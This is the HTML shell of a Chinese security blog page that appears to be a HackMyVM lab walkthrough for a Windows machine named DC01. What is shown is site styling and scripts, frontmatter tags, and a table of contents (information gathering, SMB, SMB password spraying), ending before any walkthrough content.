<!DOCTYPE html> <html><head>
		<title>20.DC01 - C1trus </title>
		<base href="..\../">
		<meta id="root-path" root-path="..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<!--<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">-->
		<meta charset="UTF-8">
		<meta name="description" content="20.DC01 - C1trus ">
		<meta property="og:title" content="20.DC01">
		<meta property="og:description" content="20.DC01 - C1trus ">
		<meta property="og:type" content="website">
		<meta property="og:url" content="https://www.c1trus.top/24-渗透/hmv/20.dc01.html">
		<meta property="og:image" content="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png">
		<meta property="og:site_name" content="C1trus ">
		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
		<meta http-equiv="Pragma" content="no-cache">
		<meta http-equiv="Expires" content="0">
		<meta name="ctime" content="1735194098042">
		<meta name="author" content="C1trus"><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://www.c1trus.top/lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><script id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><script defer="" id="easy-notice-script" src="lib/scripts/easy-notice.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js?v=1.8.03&amp;t=1735405996321" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><script defer="" id="img-zoom-script" src="lib/scripts/img-zoom.js?v=1.8.03" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;);"></script><link rel="stylesheet" href="lib/styles/obsidian.css?v=1.8.03"><link rel="preload" href="lib/styles/other-plugins.css?v=1.8.03" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/other-plugins.css?v=1.8.03"></noscript><link rel="stylesheet" href="lib/styles/theme.css?v=1.8.03"><link rel="preload" href="lib/styles/global-variable-styles.css?v=1.8.03" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css?v=1.8.03"></noscript><link rel="preload" href="lib/styles/supported-plugins.css?v=1.8.03" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/supported-plugins.css?v=1.8.03"></noscript><link rel="preload" href="lib/styles/main-styles.css?v=1.8.03" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css?v=1.8.03"></noscript><link rel="preload" href="lib/styles/snippets.css?v=1.8.03" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/snippets.css?v=1.8.03"></noscript><script>const LANG="zh-cn",VERSION="1.8.03",SHOW_COMMENTS=!0,SHOW_PAGE_HEADER=!0,SHOW_PAGE_FOOTER=!0,SHOW_RSS_FEED=!0,SHOW_SCROLL_TO_TOP=!0,SHOW_FILE_NUMBER=!0,EXPORT_PRESET="website",WALINE_SERVER_URL="https://www.c1trus.top/",AUTHOR="C1trus",VAULT_TITLE="C1trus ",FILE_COLORS={},DEFAULT_THEME="light",USE_FILE_COLOR_PLUGIN=!0,USE_BARTENDER_PLUGIN=!0</script><script src="https://unpkg.com/prismjs@1.29.0/prism.js" defer="defer"></script><script src="https://unpkg.com/lucide@latest"></script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v3/dist/waline.css"><link rel="stylesheet" href="https://unpkg.com/@waline/client@v3/dist/waline-meta.css"><style>body{--font-ui-medium:16px}:root{--waline-font-size:16px;--waline-white:#fff;--waline-light-grey:#999;--waline-dark-grey:#666;--waline-theme-color:#27ae60;--waline-active-color:#2ecc71;--waline-color:#444;--waline-bg-color:var(--background-primary-alt);--waline-bg-color-light:#f8f8f8;--waline-bg-color-hover:#f0f0f0;--waline-border-color:#ddd;--waline-disable-bg-color:#f8f8f8;--waline-disable-color:#bbb;--waline-code-bg-color:#282c34;--waline-bq-color:#f0f0f0;--waline-avatar-size:3.25rem;--waline-m-avatar-size:calc(var(--waline-avatar-size) * 9 / 13);--waline-badge-color:#3498db;--waline-badge-font-size:0.775em;--waline-info-bg-color:#f8f8f8;--waline-info-color:#999;--waline-info-font-size:0.625em;--waline-border:1px solid var(--waline-border-color);--waline-avatar-radius:50%;--waline-box-shadow:none}.waline-theme-dark{--waline-white:#000;--waline-light-grey:#666;--waline-dark-grey:#999;--waline-color:#888;--waline-bg-color:var(--background-primary-alt);--waline-bg-color-light:#272727;--waline-border-color:#333;--waline-disable-bg-color:#444;--waline-disable-color:#272727;--waline-bq-color:#272727;--waline-info-bg-color:#272727;--waline-info-color:#666}.wl-power{display:none}.wl-reaction{margin-bottom:1em;text-align:left;margin-left:.5em}.wl-reaction-title{margin:20px auto}.wl-reaction-list{justify-content:left}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:17px!important}.wl-panel{margin:0}#waline{margin-top:50px!important;max-width:800px}.clickable-icon.sidebar-collapse-icon{width:2em!important;background-color:var(--background-secondary)}.graph-view-placeholder{width:22%;margin-left:38px}.tree-container .clickable-icon{margin-left:2px;border-radius:5px;border:none;box-shadow:none;display:flex;align-items:center;justify-content:center;margin-top:-3px}.document-container>.markdown-preview-view>.markdown-preview-sizer{max-width:100vw!important}body.show-inline-title .page-title{text-align:center}input[type=text],textarea{font-size:16px!important}input[type=search]{width:85%;border:1px solid #888;border-radius:5px;background-color:var(--background-primary);color:var(--text-muted)}.tree-container .clickable-icon{background-color:transparent}body{user-select:unset}blockquote{margin:0}#copyright{text-align:center;margin-top:80px!important}#copyright a{color:#ee802f;text-decoration:none;font-size:15px;margin-left:4px}#copyright a img{width:14px}.document-container>.markdown-preview-view>.markdown-preview-sizer pre{overflow:auto}.theme-light .document-container>.markdown-preview-view>.markdown-preview-sizer pre{position:relative;background-color:var(--background-primary-alt);border:1px solid #eeecec;border-radius:5px;padding:10px}.theme-dark .document-container>.markdown-preview-view>.markdown-preview-sizer pre{position:relative;background-color:var(--background-primary-alt);border:1px solid #373838;border-radius:5px;padding:10px}.markdown-rendered pre button.copy-code-button{position:absolute;top:7px;right:7px}.wl-header input{font-size:16px}.wl-reaction-votes{text-align:center}html>body>.webpage-container>.document-container>.markdown-preview-view>.markdown-preview-sizer>div.page-meta{text-align:center;padding:10px!important}.page-ctime,.waline-comment-count,.waline-pageview-count{margin-right:35px}.page-meta{color:#888}.page-meta svg{width:16px;vertical-align:middle}#qrcode{position:relative}#qr-zoom{position:absolute;width:170px;height:200px;z-index:999;display:none;border:1px solid #ccc;background:#fff}#qrcode:hover #qr-zoom{display:inline-block}#qr-zoom img{margin-top:10px}#qr-zoom font{margin-top:4px;display:inline-block}@media (max-width:768px){#qrcode{display:none!important}}#scrollToTopBtn{display:none;position:fixed;width:46px;height:46px;border:1px solid #ddd;border-radius:5px;background-color:var(--background-primary);text-align:center;bottom:75px;right:306px;opacity:.8}#scrollToTopBtn:hover{background-color:var(--background-primary-alt)}#scrollToTopBtn svg{margin-top:11px;color:var(--text-normal)}#scrollToTopBtn.st-collapsed{right:30px}@media (max-width:768px){#scrollToTopBtn{right:12px}#scrollToTopBtn.st-collapsed{right:12px}}.theme-dark #scrollToTopBtn{border:1px solid #999}.markdown-rendered pre button.copy-code-button{background-color:var(--background-primary);padding:3px 6px;border:1px solid #888;border-radius:5px;opacity:.9}.document-container.markdown-reading-view{background-color:var(--background-primary)}table{border:1px solid var(--table-border-color);border-radius:var(--size-2-3);border-spacing:0}td,th{padding:10px;border-right:1px solid var(--table-border-color);border-bottom:1px solid var(--table-border-color)}td:last-child,th:last-child{border-right:0}tr:last-child td,tr:last-child:not(:only-child) th{border-bottom:0}table>:only-child th{border-bottom:0}.document-container>.markdown-preview-view{margin:0;padding:var(--sidebar-margin)}.sidebar-content{background-color:var(--background-primary-alt)}.nav-folder-title[data-count]::after{content:attr(data-count);font-size:calc(100% * .8);margin-right:12px}.tree-container .tree-header{width:100%}#total-files{position:absolute;right:12px;color:var(--nav-item-color);font-size:calc(100% * .8)}.tree-container .collapse-icon{display:flex;align-items:center}.internal-embed.file-embed{cursor:pointer}.sidebar-content{padding-left:0;padding-right:0}.search-input-container{padding-left:10px}.tree-container{padding-left:12px;padding-right:12px}.graph-view-wrapper{padding-left:12px;padding-right:12px}.tree-container .tree-header,body .webpage-container .tree-container .tree-scroll-area{width:calc(100% - 12px)}.tree-container .clickable-icon svg{width:18px}ul.dataview.list-view-ul li{line-height:180%}#webpage-icon{display:none}.markdown-reading-view table{margin-block-start:var(--p-spacing);margin-block-end:var(--p-spacing)}li{line-height:180%}</style><script type="module">import{init}from"https://unpkg.com/@waline/client@v3/dist/waline.js";window.initWaline=e=>{e=e||document;const t=location.pathname.replace(/index\.html$/,"").replace(/\/$/,"")||"/",o=document.querySelector("#waline"),n=document.querySelector(".markdown-preview-sizer");if(!o){const e=document.createElement("div");e.id="waline",SHOW_COMMENTS||(e.style.display="none"),n.appendChild(e)}let i=document.querySelector(".page-meta");if(!i){const o=document.querySelector(".page-title");i=document.createElement("div"),i.className="page-meta",SHOW_PAGE_HEADER||(i.style.display="none");const n=e.querySelector('meta[name="ctime"]')?.getAttribute("content")||"";let c='<span title="创建时间"><i data-lucide="clock"></i> <span class="page-ctime">'+timestampToTimeString(+n)+"</span></span> ";SHOW_COMMENTS&&(c+='<span title="评论量"><i data-lucide="message-circle-more"></i> <span class="waline-comment-count" data-path="'+t+'">0</span></span> '),c+='<span title="阅读量"><i data-lucide="eye"></i> <span class="waline-pageview-count" data-path="'+t+'">1</span></span> ',c+='<span id="qrcode" title="手机查看"><i data-lucide="qr-code"></i><span id="qr-zoom"><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data='+encodeURIComponent(location.href)+'" /><br /><font>手机查看</font></span></span>',i.innerHTML=c,o.after(i),lucide.createIcons()}try{(SHOW_PAGE_HEADER||SHOW_COMMENTS)&&init({el:"#waline",reaction:!0,dark:!1,copyright:!1,pageview:!0,comment:!0,path:t,serverURL:WALINE_SERVER_URL||"",locale:{reaction0:"点赞",reaction1:"踩一下",reaction2:"酷毙了",reaction3:"不屑",reaction4:"尴尬",reaction5:"无聊"}})}catch(e){console.log(e)}if(SHOW_SCROLL_TO_TOP&&!document.getElementById("scrollToTop")){const e=document.createElement("div");e.id="scrollToTop",e.innerHTML='<div id="scrollToTopBtn"><i data-lucide="arrow-up-to-line"></i></div>',n.appendChild(e),lucide.createIcons();var c=document.querySelector(".document-container>.markdown-preview-view"),a=document.getElementById("scrollToTopBtn");c.addEventListener("scroll",(function(){var e=c.scrollTop,t=.25*c.clientHeight;a.style.display=e>t?"block":"none"})),a.addEventListener("click",(function(){var e=document.querySelector(".document-container>.markdown-preview-view");"scrollBehavior"in document.documentElement.style?e.scrollTo({top:0,behavior:"smooth"}):e.scrollTop=0})),onToggleCollapsedChangedToTop();document.querySelector(".sidebar-right .clickable-icon.sidebar-collapse-icon").addEventListener("click",(()=>{setTimeout((()=>{onToggleCollapsedChangedToTop()}),42)}))}document.querySelectorAll(".document-container>.markdown-preview-view>.markdown-preview-sizer pre").forEach((e=>{e.addEventListener("scroll",(()=>{const t=e.querySelector(".copy-code-button"),o=t.getBoundingClientRect();t.style.right="auto",t.style.left=e.scrollLeft+e.offsetWidth-o.width-8+"px"}))})),setTimeout((()=>{if(!SHOW_COMMENTS)return;const e=document.querySelector(".wl-count");new MutationObserver((e=>{e.forEach((e=>{"characterData"!==e.type&&"childList"!==e.type||e.target.firstChild&&(document.querySelector(".waline-comment-count").innerHTML=e.target.firstChild.textContent)}))})).observe(e,{attributes:!1,childList:!0,subtree:!0,characterData:!0})}),100)}</script><script>function onAsyncLoadedDocument(e,t){togglePrismTheme("dark"!==localStorage.getItem("theme")),setTimeout((()=>{loadSpecialImg()}),42),initWaline(t),copyright(),initImgZoom(),attachDownload()}function toggleWalineTheme(e){e||document.body.classList.contains("waline-theme-dark")?document.body.classList.remove("waline-theme-dark"):document.body.classList.add("waline-theme-dark")}function onThemeToggle(e){toggleWalineTheme(e),togglePrismTheme(e)}function onSidebarCollapsed(e,t,o){const n=o.classList.contains("sidebar-left"),i=document.body.classList.contains("floating-sidebars");if(onToggleCollapsedChangedToTop(),i){const t=document.querySelector("#sidebarMask"),o=document.querySelector(".sidebar-left .tree-scroll-area"),i=isMobile();e?(t&&(t.style.display="none"),n&&o&&i&&(o.style.display="none")):(t&&(t.style.display="block"),n&&o&&i&&setTimeout((()=>{o.style.display="block"}),100))}}function onToggleCollapsedChangedToTop(){if("undefined"!=typeof scrollToTopBtn){document.querySelector(".sidebar-right").classList.contains("is-collapsed")?scrollToTopBtn.classList.add("st-collapsed"):scrollToTopBtn.classList.remove("st-collapsed")}}function copyright(){let e="© "+(new Date).getFullYear()+" "+(AUTHOR||document.querySelector('meta[name="author"]')?.getAttribute("content")||VAULT_TITLE)+' <font color="#ee802f">♡</font> 由obsidian强力驱动';SHOW_RSS_FEED&&(e+='&nbsp;<a href="lib/rss.xml"><img src="https://s21.ax1x.com/2024/04/21/pkpNoSf.png" />RSS</a>');const t=document.querySelector(".markdown-preview-sizer"),o=document.createElement("div");o.id="copyright",SHOW_PAGE_FOOTER||(o.style.display="none"),o.innerHTML=e,t.appendChild(o)}function timestampToTimeString(e){e=e||null;let t=new Date(e);return t.getFullYear()+"-"+((t.getMonth()+1<10?"0"+(t.getMonth()+1):t.getMonth()+1)+"-")+((t.getDate()<10?"0"+t.getDate():t.getDate())+" ")}function togglePrismTheme(e){const t=e?"":"-dark",o=document.getElementById("prism-theme"),n="https://unpkg.com/prismjs@1.29.0/themes/prism"+t+".min.css";if(o&&o.href===n)return;const i=document.createElement("link");i.id="prism-theme",i.rel="stylesheet",i.href=n,i.onload=()=>{o&&o.remove()},document.head.appendChild(i)}function onDomReady(e){"loading"!==document.readyState?e():document.addEventListener("DOMContentLoaded",e)}function isMobileMedia(e=768){return window.matchMedia("(max-width: "+e+"px)").matches}function initImgZoom(){ImgZoom(".document-container>.markdown-preview-view>.markdown-preview-sizer > div:not(.page-meta,.mod-footer,#waline,#scrollToTop,#copyright) img")}function onSearch(){document.querySelector(".sidebar-left input[type=search]").addEventListener("input",(e=>{setTimeout((()=>setTreeCount()),42)}))}function setTreeCount(){const e=document.querySelector(".sidebar-left .file-tree").querySelectorAll(".nav-file:not(.filtered-out)").length;if(document.querySelector("#total-files"))document.querySelector("#total-files").innerHTML=e;else{const t=document.querySelector(".tree-container .tree-header"),o=document.createElement("span");o.id="total-files",o.innerHTML=e,t.appendChild(o)}document.querySelectorAll(".sidebar-left .file-tree .nav-folder:not(.filtered-out) .tree-link .nav-folder-title").forEach((e=>{const t=e.parentElement.nextElementSibling.querySelectorAll(".nav-file:not(.filtered-out)").length;e.dataset.count=t}))}function observeTreeAreaResize(){const e=document.querySelector(".webpage-container .tree-container .tree-scroll-area");new ResizeObserver((()=>{document.querySelector("#total-files").style.right=e.offsetWidth-e.clientWidth+12+"px"})).observe(e)}function onSearchIndexing(){document.querySelector(".sidebar-left input[type=search]").placeholder="zh-cn"===LANG?"正在建立全文索引...":"Full-text indexing..."}function onSearchReady(){document.querySelector(".sidebar-left input[type=search]").placeholder="Search..."}function loadSpecialImg(){document.querySelectorAll("img[src*='+']").forEach((e=>{e.setAttribute("src",URLencode(e.getAttribute("src")))}))}function attachDownload(){setTimeout((()=>{document.querySelectorAll(".internal-embed.file-embed").forEach((e=>{e.onclick=()=>{window.open(e.getAttribute("src"))}}))}),42)}function onScrollIntoViewStart(e,t,o){setTimeout((()=>{const e=document.querySelector(".document-container>.markdown-preview-view");e.scrollLeft>0&&e.scrollTo(0,e.scrollTop)}),1500)}togglePrismTheme("dark"!==localStorage.getItem("theme")),onDomReady((()=>{let e=0;const t=(o=50)=>{const n=document.querySelector(".mod-tree-file .tree-link[href='index.html'] .tree-item-title");if(!(e>6e4)){if(n&&"index"===n.innerHTML)return n.innerHTML="首页",void loadSpecialImg();e+=o,setTimeout((()=>{t(o)}),o)}};"zh-cn"===LANG&&t(),initWaline(),toggleWalineTheme("dark"!==localStorage.getItem("theme")),copyright(),document.querySelector(".document-container").classList.remove("hide");const o=setInterval((()=>{const e=document.querySelector(".nav-file.mod-active");e&&e.parentElement&&(o&&clearInterval(o),setTimeout((()=>{if(setTimeout((()=>{const e=document.querySelectorAll(".tree-container .collapse-icon");e.length>0&&void 0===e[0].style.translate&&e.forEach((e=>{e.style.left=0}))}),50),SHOW_FILE_NUMBER&&(setTreeCount(),observeTreeAreaResize(),onSearch()),FILE_COLORS&&USE_FILE_COLOR_PLUGIN&&Object.getOwnPropertyNames(FILE_COLORS).length)for(const e in FILE_COLORS){const t=document.querySelector(".sidebar-left .tree-link[data-path='"+e+"'] .tree-item-title");t&&(t.style.color=FILE_COLORS[e])}attachDownload()}),42))}),50),n=document.createElement("div");n.id="sidebarMask",n.style="position:fixed;top:0;left:0;opacity:0;z-index:9;width:100%;height:100%;display:none;",n.onclick=function(){this.style.display="none"},document.body.appendChild(n),initImgZoom(),document.querySelector(".webpage-container input[type=search]").addEventListener("input",(e=>{searchReady||EasyNotice&&EasyNotice.createNotice("zh-cn"===LANG?"正在建立全文索引，请稍后重试...":"Full-text indexing, please try again later.",1500,"left:12px;top:12px;",!0,!1)}))}))</script></head><body class="publish css-settings-manager theme-light show-inline-title show-ribbon enable-bar-icon background-settings-workplace-background-image background-settings-workplace-waves-light background-settings-workplace-theme-dark-dark-sky background-image-settings-switch background-image-settings-markdown-page-transparent background-image-settings-markdown-page-random-default notebook-liked-markdown-page-dotted-notebook-1 background-image-settings-command-palette-switch background-image-settings-command-palette-same-as-workplace panel-page-bg-theme-dark-sea layout-style-options-rectangle native-scrollbars toggle-divider-lines clutter-free-headings h1-toggle-underline fancy-hr-icon bt-default-unordered-list rainbow-lines-reading rainbow-ordered-list rainbow-checkbox file-bg-rounded-rectangle file-name-animation unmuted-collapsed-folder folder-style-change-options-colorful-title folder-colorful-custom hr-for-pagination show-url-after-link adjustable-embed-content-height naked-embed embed-title embed-hover show-border-table link-underline-external link-underline-unresolved link-click circular-checkbox default-icons toggle-icon-anima image-zoom tag-click tag-pill-outlined admonition-bg-color-same style-options-for-admonition-plugin toggle-calendar-shadow style-options-for-calendar-plugin-style-two rainbow-checklist style-options-for-kanban-plugin-static-plain style-options-for-kanban-plugin-dynamic-neon-two style-options-for-buttons-plugin dataview-list-style-pacman no-wrapped-dvtable auto-serial-number-dvtable dialogue-style-wechat grass-light olive-dark quiet-outline-optimize colorful-p-kanban code-theme-dracula code-line-number"><script defer="">let theme=localStorage.getItem("theme")||DEFAULT_THEME||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html?v=1.8.03&amp;t=1735405996356"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><pre class="frontmatter language-yaml" style="display: none;" tabindex="0"><code class="language-yaml is-loaded"><span class="token key atrule">dg-publish</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> <span class="token string">"true"</span>
<span class="token key atrule">tags</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> HMV
  <span class="token punctuation">-</span> RID枚举
  <span class="token punctuation">-</span> SMB空会话
  <span class="token punctuation">-</span> SPN
<span class="token key atrule">难度</span><span class="token punctuation">:</span> ⭐️⭐️⭐️⭐️
<span class="token key atrule">作者</span><span class="token punctuation">:</span> josemlwdf
<span class="token key atrule">系统</span><span class="token punctuation">:</span> Windows</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title el-p" id="20.DC01" data-tag-name="p"><p dir="auto">20.DC01</p></h1><div class="el-h2 heading-wrapper" data-heading="1. 基本信息^toc" data-tag-name="h2"><h2 data-heading="1. 基本信息^toc" dir="auto" class="heading" id="1._基本信息^toc"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>1. 基本信息^toc</h2><div class="heading-children"><div class="el-ul" data-tag-name="ul"><ul>
<li data-line="0" dir="auto"><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a></li>
<li data-line="1" dir="auto"><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a></li>
<li data-line="2" dir="auto"><a data-tooltip-position="top" aria-label="3. SMB" data-href="#3. SMB" href="#3._SMB" class="internal-link" target="_self" rel="noopener nofollow">3. SMB</a></li>
<li data-line="3" dir="auto"><a data-tooltip-position="top" aria-label="4. SMB密码喷射" data-href="#4. SMB密码喷射" href="#4._SMB密码喷射" class="internal-link" target="_self" rel="noopener nofollow">4. SMB密码喷射</a></li>
